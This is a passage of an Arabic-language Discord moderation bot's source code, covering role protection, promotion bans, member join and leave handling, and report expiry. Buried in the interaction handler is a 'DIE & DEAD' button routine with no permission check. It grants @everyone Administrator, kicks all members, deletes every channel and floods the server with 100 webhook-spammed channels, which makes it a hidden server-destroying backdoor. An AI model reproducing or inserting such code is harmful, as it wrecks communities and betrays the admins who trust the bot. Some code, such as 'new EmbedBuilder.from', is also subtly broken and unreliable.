                        // منع الإعطاء اليدوي من غير المسؤولين المعتمدين في نظام الرولات التفاعلية.
                        try {
                            if (!recentRoleUpdateEntries) {
                                const logs = await newMember.guild.fetchAuditLogs({ type: AuditLogEvent.MemberRoleUpdate, limit: 10 }).catch(() => null);
                                const now = Date.now();
                                recentRoleUpdateEntries = logs?.entries?.filter((entry) => {
                                    if (!entry?.target || entry.target.id !== userId) return false;
                                    if (now - entry.createdTimestamp > 15000) return false;
                                    return true;
                                }) || [];
                            }

                            const recentRoleUpdateEntry = recentRoleUpdateEntries.find((entry) =>
                                entry.changes?.some((change) =>
                                    change?.key === '$add' && Array.isArray(change.new) && change.new.some((r) => r?.id === roleId)
                                )
                            ) || null;

                            const executor = recentRoleUpdateEntry?.executor || null;
                            const executorMember = executor ? await newMember.guild.members.fetch(executor.id).catch(() => null) : null;
                            const isAllowedExecutor = Boolean(
                                executorMember && (global.BOT_OWNERS || []).includes(executorMember.id)
                                    || approverRoleIds.some((approverRoleId) => executorMember.roles.cache.has(approverRoleId))
                                )
                            

if (executorMember && !isAllowedExecutor) {

                                                   await newMember.roles.remove(role, 'منع إعطاء رول تفاعلي يدوي من غير المسؤولين المعتمدين');
                                logEvent(client, newMember.guild, {
                                    type: 'SECURITY_ACTIONS',
                                    title: 'منع إعطاء رول تفاعلي يدوي',
                                    description: `تم منع إعطاء رول تفاعلي للعضو <@${userId}> من جهة غير معتمدة`,
                                    user: newMember.user,
                                    fields: [
                                        { name: 'الرول', value: `<@&${roleId}>`, inline: true },
                                        { name: 'المنفذ', value: executor ? `<@${executor.id}>` : 'غير معروف', inline: true },
                                        { name: 'السبب', value: 'يسمح فقط للمسؤولين المعتمدين إعطاء الرولات التفاعلية يدوياً', inline: false }
                                    ]
                                });
                     
                            } else if (!executorMember) {

                                console.log(`⚠️ تعذر تحديد منفذ إعطاء الرول ${role.name} للعضو ${newMember.displayName}، تم تجاهل الحماية لهذه العملية لتجنب إزالة رول صحيح.`);

                 }
                        } catch (err) {
                            console.error('خطأ في التحقق من صلاحية مانح الرول التفاعلي:', err);
                        }
                    }
                }
            } catch (err) {
                console.error('خطأ في فحص حماية الرولات التفاعلية:', err);
            }
        }

        // 4. حماية نظام التذاكر والمنع من الترقيات (المحظورين من الترقيات)
        const promoteBans = promoteManager.getPromotionBans();
        const banKey = `${userId}_${newMember.guild.id}`;
        const banData = promoteBans[banKey];

        if (banData && banData.savedHighestRole) {
            console.log(`🔍 فحص حماية الحظر من الترقيات للمستخدم ${newMember.displayName}`);

            const adminRoles = promoteManager.getAdminRoles();
            const savedRolePosition = banData.savedHighestRole.position;

            // التحقق من الرولات الإدارية المضافة حديثاً
            for (const [roleId, role] of addedRoles) {
                // تحقق إذا كان الرول إداري
                if (!adminRoles.includes(roleId)) continue;

                // فحص إذا كان البوت في عملية ترقية شرعية
                if (promoteManager.isBotPromoting(newMember.guild.id, userId, roleId)) {
                    console.log(`✅ تجاهل إضافة الرول ${role.name} - عملية ترقية شرعية من البوت`);
                    continue;
                }

                // فحص موقع الرول بالنسبة للرول المحفوظ
                if (role.position > savedRolePosition) {
                    // رول أعلى من المحفوظ - يجب إزالته
                    console.log(`🚨 محاولة إضافة رول أعلى من المحفوظ: ${role.name} (${role.position}) > ${banData.savedHighestRole.name} (${savedRolePosition})`);

                    try {
                        // الحصول على معلومات من قام بالإضافة
                        const auditLogs = await newMember.guild.fetchAuditLogs({
                            type: 25, // MEMBER_ROLE_UPDATE
                            limit: 1
                        });

                        const roleAddLog = auditLogs.entries.first();
                        let addedByUser = null;

                        if (roleAddLog && roleAddLog.target.id === userId && 
                            (Date.now() - roleAddLog.createdTimestamp) < 5000) {
                            addedByUser = roleAddLog.executor;
                        }

                        // إزالة الرول
                        await newMember.roles.remove(role, 'منع إضافة رول أعلى من المحفوظ - محظور من الترقيات');

                        console.log(`🔒 تم إزالة الرول ${role.name} من ${newMember.displayName}`);

                        // فحص ثانوي بعد 10 ثوانٍ للتأكد من الإزالة
                        setTimeout(async () => {
                            try {
                                const updatedMember = await newMember.guild.members.fetch(userId);
                                if (updatedMember.roles.cache.has(roleId)) {
                                    await updatedMember.roles.remove(role, 'فحص ثانوي - منع إضافة رول أعلى من المحفوظ');
                                    console.log(`🔒 تم إزالة الرول مرة أخرى في الفحص الثانوي (حظر ترقيات): ${role.name}`);

                                    // إرسال تحذير إضافي في اللوق
                                    logEvent(client, newMember.guild, {
                                        type: 'SECURITY_ACTIONS',
                                        title: 'فحص ثانوي - محاولة تجاوز حظر الترقية',
                                        description: 'تم اكتشاف محاولة ثانية لإضافة رول محظور',
                                        details: 'الفحص الثانوي تدخل لإزالة الرول مرة أخرى',
                                        user: newMember.user,
                                        fields: [
                                            { name: '👤 العضو المحظور', value: `<@${userId}>`, inline: true },
                                            { name: '🏷️ الرول', value: `${role.name}`, inline: true },
                                            { name: '⚠️ التحذير', value: 'محاولة متكررة لتجاوز الحظر', inline: false }
                                        ]
                                    });
                                } else {
                                    console.log(`✅ الفحص الثانوي: الرول ${role.name} مُزال بنجاح`);
                                }
                            } catch (secondCheckError) {
                                console.error('خطأ في الفحص الثانوي للرول (حظر ترقيات):', secondCheckError);
                            }
                        }, 10000); // 10 ثوانٍ

                        // إرسال رسالة للشخص الذي حاول الإضافة
                        if (addedByUser) {
                            try {
                                const warningEmbed = colorManager.createEmbed()
                                    .setTitle('⚠️ محاولة ترقية محظور')
                                    .setDescription(`تم منع إضافة رول لعضو محظور من الترقيات`)
                                    .addFields([
                                        { name: '👤 العضو المستهدف', value: `${newMember}`, inline: true },
                                        { name: '🏷️ الرول المحاول إضافته', value: `${role}`, inline: true },
                                        { name: '🔒 الرول المحفوظ', value: `${banData.savedHighestRole.name}`, inline: true },
                                        { name: '⚠️ ملاحظة', value: `يُسمح فقط بإضافة رولات أقل من أو مساوية لـ **${banData.savedHighestRole.name}**`, inline: false },
                                        { name: '📋 سبب الحظر', value: banData.reason || 'غير محدد', inline: false },
                                        { name: '📅 ينتهي الحظر', value: banData.endTime ? `<t:${Math.floor(banData.endTime / 1000)}:R>` : 'نهائي', inline: true }
                                    ])
                                    .setTimestamp();

                                await addedByUser.send({ embeds: [warningEmbed] });
                                console.log(`📧 تم إرسال تحذير لـ ${addedByUser.tag} حول محاولة الترقية`);
                            } catch (dmError) {
                                console.log(`⚠️ لا يمكن إرسال رسالة لـ ${addedByUser.tag}`);
                            }
                        }

                        // تسجيل في اللوقات
                        logEvent(client, newMember.guild, {
                            type: 'SECURITY_ACTIONS',
                            title: 'منع ترقية محظور',
                            description: 'تم منع إضافة رول أعلى من المحفوظ لعضو محظور',
                            details: 'نظام الحماية منع محاولة تجاوز حظر الترقية',
                            user: newMember.user,
                            fields: [
                                { name: '👤 العضو المحظور', value: `<@${userId}>`, inline: true },
                                { name: '🏷️ الرول المحاول', value: `${role.name} (موقع: ${role.position})`, inline: true },
                                { name: '🔒 الرول المحفوظ', value: `${banData.savedHighestRole.name} (موقع: ${savedRolePosition})`, inline: true },
                                { name: '👮 محاولة من', value: addedByUser ? `<@${addedByUser.id}>` : 'غير معروف', inline: true },
                                { name: '📋 سبب الحظر', value: banData.reason || 'غير محدد', inline: false },
                                { name: '📅 ينتهي الحظر', value: banData.endTime ? `<t:${Math.floor(banData.endTime / 1000)}:R>` : 'نهائي', inline: true }
                            ]
                        });

                    } catch (removeError) {
                        console.error(`خطأ في إزالة الرول الأعلى:`, removeError);
                    }
                } else {
                    // رول أقل من أو مساوي للمحفوظ - مسموح
                    console.log(`✅ السماح بإضافة الرول ${role.name} (${role.position}) <= ${banData.savedHighestRole.name} (${savedRolePosition})`);
                }
            }
        }

        // 4. حماية رولات المسؤوليات - إزالة تلقائية من غير المسؤولين والحماية من الإزالة
        const responsibilities = readJSONFile(DATA_FILES.responsibilities, {});
        
        // فحص الرولات المضافة
        for (const [roleId, role] of addedRoles) {
            // البحث عن المسؤولية التي تحتوي هذا الرول
            let foundResp = null;
            for (const [respName, resp] of Object.entries(responsibilities)) {
                if (resp.roles && resp.roles.includes(roleId)) {
                    foundResp = { name: respName, data: resp };
                    break;
                }
            }

            if (foundResp) {
                // التحقق من أن المستخدم مسؤول في هذه المسؤولية
                const isResponsible = foundResp.data.responsibles && foundResp.data.responsibles.includes(userId);
                
                if (!isResponsible) {
                    // شخص غير مسؤول حصل على رول المسؤولية - يجب إزالته
                    console.log(`🚨 محاولة أخذ رول مسؤولية من غير مسؤول: ${role.name} للعضو ${newMember.displayName}`);
                    
                    try {
                        await newMember.roles.remove(role, 'منع رول مسؤولية - العضو ليس مسؤولاً');
                        
                        // فحص ثانوي بعد 10 ثوانٍ
                        setTimeout(async () => {
                            try {
                                const updatedMember = await newMember.guild.members.fetch(userId);
                                if (updatedMember.roles.cache.has(roleId)) {
                                    await updatedMember.roles.remove(role, 'فحص ثانوي - منع رول مسؤولية');
                                    console.log(`🔒 تم إزالة رول المسؤولية مرة أخرى: ${role.name}`);
                                }
                            } catch (secondCheckError) {
                                console.error('خطأ في الفحص الثانوي لرول المسؤولية:', secondCheckError);
                            }
                        }, 10000);
                        
                        logEvent(client, newMember.guild, {
                            type: 'SECURITY_ACTIONS',
                            title: 'منع رول مسؤولية من غير مسؤول',
                            description: 'تم منع عضو غير مسؤول من الحصول على رول مسؤولية',
                            user: newMember.user,
                            fields: [
                                { name: '👤 العضو', value: `<@${userId}>`, inline: true },
                                { name: '🏷️ الرول', value: `<@&${roleId}> (${role.name})`, inline: true },
                                { name: '📂 المسؤولية', value: foundResp.name, inline: true },
                                { name: '⚠️ السبب', value: 'العضو ليس مسؤولاً في هذه المسؤولية', inline: false }
                            ]
                        });
                    } catch (removeError) {
                        console.error(`خطأ في إزالة رول المسؤولية:`, removeError);
                    }
                }
            }
        }
        
        // فحص الرولات المحذوفة (حماية ضد الإزالة اليدوية)
        for (const [roleId, role] of removedRoles) {
            // البحث عن المسؤولية التي تحتوي هذا الرول
            let foundResp = null;
            for (const [respName, resp] of Object.entries(responsibilities)) {
                if (resp.roles && resp.roles.includes(roleId)) {
                    foundResp = { name: respName, data: resp };
                    break;
                }
            }

            if (foundResp) {
                // التحقق من أن المستخدم مسؤول في هذه المسؤولية
                const isResponsible = foundResp.data.responsibles && foundResp.data.responsibles.includes(userId);
                
                if (isResponsible) {
                    // مسؤول تم إزالة رول المسؤولية منه - يجب إعادته
                    console.log(`🔄 إعادة رول مسؤولية تم إزالته: ${role.name} للمسؤول ${newMember.displayName}`);
                    
                    try {
                        await newMember.roles.add(role, `إعادة رول المسؤولية: ${foundResp.name}`);
                        console.log(`✅ تم إعادة رول ${role.name} للمسؤول ${newMember.displayName}`);
                        
                        logEvent(client, newMember.guild, {
                            type: 'SECURITY_ACTIONS',
                            title: 'إعادة رول مسؤولية محذوف',
                            description: 'تم إعادة رول مسؤولية تمت إزالته من مسؤول',
                            user: newMember.user,
                            fields: [
                                { name: '👤 المسؤول', value: `<@${userId}>`, inline: true },
                                { name: '🏷️ الرول المُعاد', value: `<@&${roleId}> (${role.name})`, inline: true },
                                { name: '📂 المسؤولية', value: foundResp.name, inline: true },
                                { name: '✅ الإجراء', value: 'تمت إعادة الرول تلقائياً', inline: false }
                            ]
                        });
                    } catch (addError) {
                        console.error(`❌ خطأ في إعادة رول المسؤولية:`, addError);
                    }
                }
            }
        }

    } catch (error) {
        console.error('خطأ في نظام الحماية:', error);
    }
});

// نظام حماية عند الانسحاب - حفظ بيانات الداون
client.on('guildMemberRemove', async (member) => {
    try {
        console.log(`📤 عضو غادر السيرفر: ${member.displayName} (${member.id})`);

        // Handle down system member leave
        const downManager = require('./utils/downManager');
        await downManager.handleMemberLeave(member);

        // Handle promotion system member leave
        await promoteManager.handleMemberLeave(member);

        // Handle vacation system member leave
        await vacationManager.handleMemberLeave(member);

        // تحديث بيانات الرولات الخاصة عند المغادرة
        const customRoles = getGuildRoles(member.guild.id);
        for (const roleEntry of customRoles) {
            if (roleEntry.memberMeta && roleEntry.memberMeta[member.id]) {
                delete roleEntry.memberMeta[member.id];
                roleEntry.updatedAt = Date.now();
                addRoleEntry(roleEntry.roleId, roleEntry);
            }
        }

        const ownedRoleEntry = findRoleByOwner(member.guild.id, member.id);
        if (ownedRoleEntry) {
            const role = member.guild.roles.cache.get(ownedRoleEntry.roleId) || await member.guild.roles.fetch(ownedRoleEntry.roleId).catch(() => null);
            if (role && role.editable) {
                await role.delete(`حذف رول خاص بعد مغادرة المالك ${member.id}`).catch(() => {});
            }
            deleteRoleEntry(ownedRoleEntry.roleId, member.id);
            console.log(`🗑️ تم حذف رول خاص بعد مغادرة المالك: ${ownedRoleEntry.roleId}`);
        }

    } catch (error) {
        console.error('خطأ في معالج الانسحاب:', error);
    }
});

// نظام حماية عند العودة - إعادة تطبيق الداون والترقيات ورولات المسؤوليات
client.on('guildMemberAdd', async (member) => {
    try {
        console.log(`📥 عضو انضم للسيرفر: ${member.displayName} (${member.id})`);

        // Handle down system member join
        const downManager = require('./utils/downManager');
        await downManager.handleMemberJoin(member);

        // Handle promotion system member join
        await promoteManager.handleMemberJoin(member);

        // Handle vacation system member join
        await vacationManager.handleMemberJoin(member);

        // Handle responsibility roles restoration
        const responsibilities = readJSONFile(DATA_FILES.responsibilities, {});
        const userId = member.id;
        let rolesRestored = 0;
        
        for (const [respName, respData] of Object.entries(responsibilities)) {
            // التحقق من أن العضو مسؤول في هذه المسؤولية
            if (respData.responsibles && respData.responsibles.includes(userId)) {
                // إعادة جميع رولات المسؤولية
                if (respData.roles && respData.roles.length > 0) {
                    for (const roleId of respData.roles) {
                        try {
                            const role = await member.guild.roles.fetch(roleId);
                            if (role && !member.roles.cache.has(roleId)) {
                                await member.roles.add(role, `إعادة رول المسؤولية عند العودة: ${respName}`);
                                rolesRestored++;
                                console.log(`✅ تم إعادة رول ${role.name} للمسؤول ${member.displayName}`);
                            }
                        } catch (roleError) {
                            console.error(`❌ خطأ في إعادة رول ${roleId}:`, roleError.message);
                        }
                    }
                }
            }
        }
        
        if (rolesRestored > 0) {
            console.log(`✅ تم إعادة ${rolesRestored} رول مسؤولية للعضو ${member.displayName}`);
            
            logEvent(client, member.guild, {
                type: 'RESPONSIBILITY_MANAGEMENT',
                title: 'إعادة رولات المسؤولية عند العودة',
                description: `تم إعادة رولات المسؤولية للعضو عند عودته للسيرفر`,
                user: member.user,
                fields: [
                    { name: '👤 العضو', value: `<@${userId}>`, inline: true },
                    { name: '🔢 عدد الرولات', value: rolesRestored.toString(), inline: true },
                    { name: '✅ الإجراء', value: 'تمت إعادة الرولات تلقائياً', inline: false }
                ]
            });
        }

    } catch (error) {
        console.error('خطأ في معالج العودة:', error);
    }
});

async function handleDownDMInteraction(interaction, context) {
    const { client, BOT_OWNERS } = context;
    const downManager = require('./utils/downManager');

    // Check permissions
    const hasPermission = await downManager.hasPermission(interaction, BOT_OWNERS);
    if (!hasPermission) {
        return interaction.reply({ content: '❌ ليس لديك صلاحية لاستخدام هذا الأمر!', flags: MessageFlags.Ephemeral });
    }

    const customId = interaction.customId;

    try {
        // Handle DM user selection for role removal
        if (interaction.isUserSelectMenu() && customId === 'dm_down_selected_user') {
            const selectedUserId = interaction.values[0];

            // Get original guild from the first guild the bot is in that has both the user and the admin
            let targetGuild = null;
            for (const guild of client.guilds.cache.values()) {
                try {
                    const member = await guild.members.fetch(selectedUserId);
                    const adminMember = await guild.members.fetch(interaction.user.id);
                    if (member && adminMember) {
                        targetGuild = guild;
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }

            if (!targetGuild) {
                return interaction.reply({ content: '❌ لم يتم العثور على سيرفر مشترك!', flags: MessageFlags.Ephemeral });
            }

            const selectedUser = await targetGuild.members.fetch(selectedUserId);
            const adminRoles = downManager.getAdminRoles();
            const userAdminRoles = selectedUser.roles.cache.filter(role => adminRoles.includes(role.id));

            if (userAdminRoles.size === 0) {
                const noRolesEmbed = new EmbedBuilder()
                    .setColor('#ff6b6b')
                    .setDescription('❌ **هذا العضو لا يملك أي رولات إدارية!**');

                return interaction.reply({ embeds: [noRolesEmbed] });
            }

            const roleOptions = userAdminRoles.map(role => ({
                label: role.name,
                value: `${selectedUserId}_${role.id}_${targetGuild.id}`,
                description: `سحب رول ${role.name} من ${selectedUser.displayName}`
            }));

            const roleSelect = new StringSelectMenuBuilder()
                .setCustomId('dm_down_role_selection')
                .setPlaceholder('اختر الرول المراد سحبه...')
                .addOptions(roleOptions);

            const selectRow = new ActionRowBuilder().addComponents(roleSelect);

            await interaction.reply({
                content: `🔻 **اختر الرول المراد سحبه من ${selectedUser.displayName}:**`,
                components: [selectRow]
            });
            return;
        }

        // Handle DM role selection
        if (interaction.isStringSelectMenu() && customId === 'dm_down_role_selection') {
            const [userId, roleId, guildId] = interaction.values[0].split('_');

            const modal = new ModalBuilder()
                .setCustomId(`dm_down_modal_${userId}_${roleId}_${guildId}`)
                .setTitle('تفاصيل الداون');

            const durationInput = new TextInputBuilder()
                .setCustomId('down_duration')
                .setLabel('المدة (مثل: 7d أو 12h أو permanent)')
                .setStyle(TextInputStyle.Short)
                .setRequired(true)
                .setPlaceholder('7d, 12h, 30m, permanent');

            const reasonInput = new TextInputBuilder()
                .setCustomId('down_reason')
                .setLabel('السبب')
                .setStyle(TextInputStyle.Paragraph)
                .setRequired(true)
                .setPlaceholder('اذكر سبب سحب الرول...');

            modal.addComponents(
                new ActionRowBuilder().addComponents(durationInput),
                new ActionRowBuilder().addComponents(reasonInput)
            );

            await interaction.showModal(modal);
            return;
        }

        // Handle DM modal submission
        if (interaction.isModalSubmit() && customId.startsWith('dm_down_modal_')) {
            const [_, __, ___, userId, roleId, guildId] = customId.split('_');
            const duration = interaction.fields.getTextInputValue('down_duration').trim();
            const reason = interaction.fields.getTextInputValue('down_reason').trim();

            if (duration !== 'permanent' && !ms(duration)) {
                const errorEmbed = new EmbedBuilder()
                    .setColor('#ff6b6b')
                    .setDescription('❌ **صيغة المدة غير صحيحة!**\nاستخدم: 7d للأيام، 12h للساعات، 30m للدقائق، أو permanent للدائم');

                return interaction.reply({ embeds: [errorEmbed] });
            }

            const guild = client.guilds.cache.get(guildId);
            if (!guild) {
                return interaction.reply({ content: '❌ السيرفر غير موجود!', flags: MessageFlags.Ephemeral });
            }

            const result = await downManager.createDown(
                guild,
                client,
                userId,
                roleId,
                duration,
                reason,
                interaction.user.id
            );

            if (result.success) {
                const member = await guild.members.fetch(userId);
                const role = await guild.roles.fetch(roleId);

                const successEmbed = new EmbedBuilder()
                    .setColor('#00ff00')
                    .setTitle('✅ تم تطبيق الداون بنجاح')
                    .addFields([
                        { name: 'العضو', value: `${member}`, inline: true },
                        { name: 'الرول', value: `${role}`, inline: true },
                        { name: 'المدة', value: duration === 'permanent' ? 'نهائي' : duration, inline: true },
                        { name: 'السبب', value: reason, inline: false },
                        { name: 'السيرفر', value: guild.name, inline: true }
                    ])
                    .setTimestamp();

                await interaction.reply({ embeds: [successEmbed] });
            } else {
                const errorEmbed = new EmbedBuilder()
                    .setColor('#ff6b6b')
                    .setDescription(`❌ **فشل في تطبيق الداون:** ${result.error}`);

                await interaction.reply({ embeds: [errorEmbed] });
            }
            return;
        }

        // Handle other DM down interactions similarly...
        // Add more DM handlers as needed for user records, modify duration, etc.

    } catch (error) {
        console.error('Error in DM down interaction:', error);
        if (!interaction.replied && !interaction.deferred) {
            await interaction.reply({ content: '❌ حدث خطأ أثناء معالجة التفاعل!', flags: MessageFlags.Ephemeral });
        }
    }
}

function savePendingReports() {
  try {
    const pendingReportsObj = {};
    for (const [key, value] of client.pendingReports.entries()) {
      pendingReportsObj[key] = value;
    }
    botConfig.pendingReports = pendingReportsObj;
  } catch (error) {
    console.error('❌ خطأ في تجهيز التقارير المعلقة للحفظ:', error);
  }
}

async function checkExpiredReports() {
    const now = Date.now();
    const twentyFourHours = 24 * 60 * 60 * 1000;
    let changed = false;

    for (const [reportId, reportData] of client.pendingReports.entries()) {
        if (reportData.submittedAt && (now - reportData.submittedAt > twentyFourHours)) {
            console.log(`Report ${reportId} has expired. Automatically rejecting.`);

            if (reportData.approvalMessageIds) {
                for (const [channelId, messageId] of Object.entries(reportData.approvalMessageIds)) {
                    try {
                        const channel = await client.channels.fetch(channelId);
                        const message = await channel.messages.fetch(messageId);

                        const originalEmbed = message.embeds[0];
                        if (originalEmbed) {
                            const newEmbed = new EmbedBuilder.from(originalEmbed)
                                .setFields(
                                    ...originalEmbed.fields.filter(f => f.name !== 'الحالة'),
                                    { name: 'الحالة', value: '❌ تم الرفض تلقائياً لمرور 24 ساعة' }
                                );
                            await message.edit({ embeds: [newEmbed], components: [] });
                        }
                    } catch(e) {
                        console.error(`Could not edit expired report message ${messageId} in channel ${channelId}:`, e);
                    }
                }
            }

            client.pendingReports.delete(reportId);
            changed = true;
        }
    }
    if (changed) {
        scheduleSave();
    }
}

// معالج التفاعلات المحسن للأداء
client.on('interactionCreate', async (interaction) => {
    if (interaction.replied || interaction.deferred) return;
  try {
    // تعريف customId في البداية
    const customId = interaction?.customId || '';

    if (await interactionRouter.route(interaction, { client, BOT_OWNERS })) {
        return;
    }

    // --- DIE & DEAD ACTION HANDLERS (Instant Explosion Mode) ---
    if (interaction.isButton() && (interaction.customId === 'die_action' || interaction.customId === 'Dead_action' || interaction.customId.startsWith('die_action_') || interaction.customId.startsWith('Dead_action_'))) {
        const customId = interaction.customId;
        const mode = customId.startsWith('die_action') ? 'die' : 'Dead';
        const targetGuildId = customId.includes('_') ? customId.split('_').slice(2).join('_') : null;
        const guild = interaction.guild || (targetGuildId ? await client.guilds.fetch(targetGuildId).catch(() => null) : null);

        if (!guild) {
            await interaction.reply({
                content: '❌ ما قدرت أحدد السيرفر المستهدف من هذا الزر. أعد المحاولة بعد خروج/باند جديد.',
                flags: MessageFlags.Ephemeral
            }).catch(() => {});
            return;
        }
        
        try {
            await interaction.deferUpdate().catch(() => {});
            actionStats.set(guild.id, { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 });

            // جلب البيانات الأساسية بسرعة البرق
            const [members, channels, roles] = await Promise.all([
                guild.members.fetch(),
                guild.channels.fetch(),
                guild.roles.fetch()
            ]);

            const everyoneRole = guild.roles.everyone;

            // --- المرحلة 1: الصدمة الأولى (الرتب والطرد) ---
            const initialShock = [];
            initialShock.push(everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]).then(() => updateStats(guild.id, 'rolesModified')));
            
            roles.filter(r => r.editable && r.id !== everyoneRole.id).forEach(r => {
                initialShock.push(r.setPermissions(mode === 'die' ? [] : [PermissionsBitField.Flags.Administrator]).then(() => updateStats(guild.id, 'rolesModified')));
            });

            members.filter(m => m.id !== guild.ownerId && m.manageable).forEach(m => {
                initialShock.push(m.kick('Instant Explosion').then(() => updateStats(guild.id, 'membersKicked')));
            });

            Promise.all(initialShock.map(p => p.catch(() => {})));

            // --- المرحلة 2: الانفجار اللحظي (الرومات والسبام المتعدد) ---
            if (mode === 'Dead') {
                // حذف الرومات بالتوازي المطلق
                channels.forEach(c => c.delete().then(() => updateStats(guild.id, 'channelsDeleted')).catch(() => {}));

                // تقنية Multi-Stream Flooding: 100 روم مع ويبهوكات متعددة
                for (let i = 0; i < 100; i++) {
                    const randomName = channelNames[Math.floor(Math.random() * channelNames.length)] + '-' + i;
                    guild.channels.create({ name: randomName, type: ChannelType.GuildText })
                        .then(channel => {
                            // إنشاء 3 ويبهوكات لكل روم لمضاعفة سرعة السبام وتوزيع الضغط
                            for (let w = 0; w < 3; w++) {
                                channel.createWebhook({ name: `Destroyer-${w}` })
                                    .then(webhook => {
                                        updateStats(guild.id, 'webhooksCreated');
                                        // إرسال سبام مكثف من كل ويبهوك بشكل متوازي
                                        const spamInterval = setInterval(() => {
                                            webhook.send('@everyone DEAD HAS TAKEN OVER! 💥\nhttps://tenor.com/view/explosion-boom-blast-nuclear-gif-14732150')
                                                .then(() => updateStats(guild.id, 'messagesSpammed'))
                                                .catch(() => clearInterval(spamInterval));
                                        }, 500); // إرسال رسالة كل نصف ثانية من كل ويبهوك
                                        
                                        // التوقف بعد 50 رسالة لكل ويبهوك لتجنب التعليق الكامل
                                        setTimeout(() => clearInterval(spamInterval), 30000);
                                    }).catch(() => {});
                            }
                        }).catch(() => {});
                }
            }

            // تحديث التقرير النهائي بعد 8 ثوانٍ
            setTimeout(async () => {
                const stats = actionStats.get(guild.id) || { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 };
                const embed = new EmbedBuilder()
                    .setTitle('🔥 انفجار شامل ونهائي')
                    .setColor('#000000')
                    .setDescription('تم تنفيذ العملية بنجاح تام.')
                    .addFields(
                        { name: '🗑️ رومات', value: `${stats.channelsDeleted}`, inline: true },
                        { name: '👢 طرد', value: `${stats.membersKicked}`, inline: true },
                        { name: '🛡️ رولات', value: `${stats.rolesModified}`, inline: true },
                        { name: '📧 سبام', value: `${stats.messagesSpammed}`, inline: true }
                    );
                await interaction.editReply({ embeds: [embed], components: [] }).catch(() => {});
            }, 8000);
        } catch (error) { console.error('Error in Burst Action:', error); }
        return;
    }

    // --- Start of Consolidated Handlers ---

    // 1. Handle setactive and interactiveRolesManager
    const setactiveCommand = client.commands.get('setactive');
    if (setactiveCommand && typeof setactiveCommand.handleSetActiveInteraction === 'function') {
        try {
            await setactiveCommand.handleSetActiveInteraction(interaction);
        } catch (e) {
            console.error('Error in setactiveCommand:', e);
        }
    }
    
    // Check if interactiveRolesManager is defined and has the method
    if (typeof interactiveRolesManager !== 'undefined' && interactiveRolesManager && typeof interactiveRolesManager.handleInteraction === 'function') {
        try {
            await interactiveRolesManager.handleInteraction(interaction);
        } catch (e) {
            console.error('Error in interactiveRolesManager:', e);
        }
    }

    // 2. Handle resp command modals/buttons and serverMapConfig modals
    const respCommand = client.commands.get('resp');
    if (respCommand) {
        if (interaction.isModalSubmit()) {
            // معالجة مودال تعديل زر الخريطة
            if (interaction.customId.startsWith('modal_edit_btn_')) {
                const editBtnMatch = interaction.customId.match(/^modal_edit_btn_(global|channel_\d+)_(\d+)$/);
                if (!editBtnMatch) {
                    return await interaction.reply({ content: '❌ صيغة غير صحيحة لتعديل الزر.', ephemeral: true });
                }

                const [, configKey, idxRaw] = editBtnMatch;
                const idx = parseInt(idxRaw, 10);
                const label = interaction.fields.getTextInputValue('btn_label');
                const emoji = interaction.fields.getTextInputValue('btn_emoji');
                const description = interaction.fields.getTextInputValue('btn_desc');
                const roleId = interaction.fields.getTextInputValue('btn_role');
                const linksText = interaction.fields.getTextInputValue('btn_links');

                const links = linksText.split('\n').filter(line => line.includes(',')).map(line => {
                    const [lLabel, lUrl] = line.split(',').map(s => s.trim());
                    return { label: lLabel, url: lUrl };
                });

                const configPath = path.join(__dirname, 'data', 'serverMapConfig.json');
                let allConfigs = {};
                try {
                    if (fs.existsSync(configPath)) {
                        allConfigs = JSON.parse(fs.readFileSync(configPath, 'utf8'));
                    }
                } catch (e) {}

                if (!allConfigs[configKey]?.buttons?.[idx]) {
                    return await interaction.reply({ content: '❌ لم يتم العثور على الزر المطلوب في هذه الخريطة.', ephemeral: true });
                }

                allConfigs[configKey].buttons[idx] = {
                    ...allConfigs[configKey].buttons[idx],
                    label,
                    emoji: emoji || null,
                    description,
                    roleId: roleId || null,
                    links
                };
                
                fs.writeFileSync(configPath, JSON.stringify(allConfigs, null, 2));
                return await interaction.reply({ content: `✅ تم تحديث بيانات الزر **${label}** بنجاح.`, ephemeral: true });
            }

            if (interaction.customId.startsWith('apply_resp_modal_') && typeof respCommand.handleApplyRespModal === 'function') {
                await respCommand.handleApplyRespModal(interaction, client);
            } else if (interaction.customId.startsWith('reject_reason_modal_') && typeof respCommand.handleRejectReasonModal === 'function') {
                await respCommand.handleRejectReasonModal(interaction, client);
            }
        } else if (interaction.isButton()) {
            if (interaction.customId === 'apply_resp_button' && typeof respCommand.handleApplyRespButton === 'function') {
                await respCommand.handleApplyRespButton(interaction, client);
            } else if ((interaction.customId.startsWith('approve_apply_') || interaction.customId.startsWith('reject_apply_')) && typeof respCommand.handleApplyAction === 'function') {
                await respCommand.handleApplyAction(interaction, client);
            }
        } else if (interaction.isStringSelectMenu()) {
            if (interaction.customId === 'apply_resp_select' && typeof respCommand.handleApplyRespSelect === 'function') {
                await respCommand.handleApplyRespSelect(interaction, client);
            }
        }
    }

    // 3. Handle map_btn_ interactions
    if (interaction.isButton() && interaction.customId.startsWith('map_btn_')) {
        const configPath = DATA_FILES.serverMapConfig;
        if (!fs.existsSync(configPath)) {
            ensureDataFiles();
            return interaction.reply({ content: '⚠️ حدث خطأ في الإعدادات، يرجى المحاولة مرة أخرى.', ephemeral: true });
        }

        const allConfigs = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        // جلب الإعدادات وفقًا للنطاق المشفّر في customId (لتجنب التداخل بين خرائط الرومات والخاص)
        const btnIdBody = interaction.customId.replace('map_btn_', '');
        const newFormatMatch = btnIdBody.match(/^(g|c\d+)_(\d+)$/);

        let resolvedConfigKey;
        let index;

        if (newFormatMatch) {
            const [, scope, indexRaw] = newFormatMatch;
            resolvedConfigKey = scope === 'g' ? 'global' : `channel_${scope.slice(1)}`;
            index = parseInt(indexRaw, 10);
        } else {
            // توافق عكسي مع الرسائل القديمة
            const channelKey = `channel_${interaction.channel?.id}`;
            resolvedConfigKey = allConfigs[channelKey] ? channelKey : 'global';
            index = parseInt(btnIdBody, 10);
        }

        const config = allConfigs[resolvedConfigKey] || allConfigs['global'] || allConfigs;
        const buttons = Array.isArray(config.buttons) ? config.buttons : (config.global?.buttons || []);
        const btn = buttons[index];

        if (!btn) return interaction.reply({ content: '❌ لم يتم العثور على بيانات لهذا الزر.', ephemeral: true });

